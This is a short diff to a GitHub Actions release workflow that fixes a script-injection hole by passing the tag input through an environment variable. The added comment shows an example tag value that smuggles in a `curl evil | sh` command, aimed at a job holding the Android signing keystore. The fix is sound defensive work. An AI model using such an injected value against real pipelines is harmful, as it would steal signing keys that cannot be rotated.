@@ -52,8 +52,19 @@ jobs:
       # mistake nobody notices until a user reports the wrong version.
       - name: Tag and pubspec version must agree
         id: version
+        # Through env, never `${{ }}` inside the script body. A `${{ }}`
+        # expression is substituted into the shell source before bash parses it,
+        # so a workflow_dispatch tag of `x"; curl evil | sh; #` did not compare
+        # unequal to anything — it ran, in a job whose environment holds
+        # ANDROID_KEYSTORE_BASE64 and its three passwords.
+        #
+        # That is the one credential here with no recovery: Android refuses an
+        # upgrade whose signing key changed, so a leaked keystore cannot be
+        # rotated without every installed user uninstalling first.
+        env:
+          TAG: ${{ inputs.tag || github.ref_name }}
         run: |
-          tag="${{ inputs.tag || github.ref_name }}"
+          tag="$TAG"
           pubspec=$(grep -m1 '^version:' app/pubspec.yaml | sed 's/version:[[:space:]]*//')
           semver="${pubspec%%+*}"
           if [ "$tag" != "v$semver" ]; then
